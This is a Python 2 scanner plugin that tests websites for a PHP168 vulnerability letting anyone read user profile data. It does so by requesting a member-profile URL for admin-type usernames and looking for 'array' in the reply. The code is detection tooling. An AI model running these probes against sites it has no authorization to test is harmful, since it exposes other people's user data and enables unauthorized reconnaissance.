#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger


def run_domain(http,ob):
    result = []
    try:

        frame = ob.get('siteType')
        if frame and frame in ['jsp', 'asp', 'aspx']:
            return []

        scheme = ob['scheme']
        domain = ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        result = []

        username_list = [
            'admin',
            'Admin',
            'test',
            'Administrator'
        ]
        # 检测请求为http://{domain}/com/homepage.php/{username}/member-profile
        for username in username_list:
            new_url = "%s://%s%s%s%s" % (scheme, domain, '/com/homepage.php/', username, '/member-profile')
            res, content = http.request(new_url, 'GET', headers=header)
            if res and res.get('status') == 200 and re.search('array', content ,re.I):
                detail = "检测到PHP168任意用户信息读取漏洞"
                request = getRequest(new_url, domain=ob['domain'])
                response = getResponse(res, content, 'array')
                result.append(getRecord(ob, new_url, ob['level'], detail, request, response))
                break

    except Exception, e:
        logger.error("File:PHP168InformationleakageScript_yd.py, run_domain function :%s" % (str(e)))

    return result





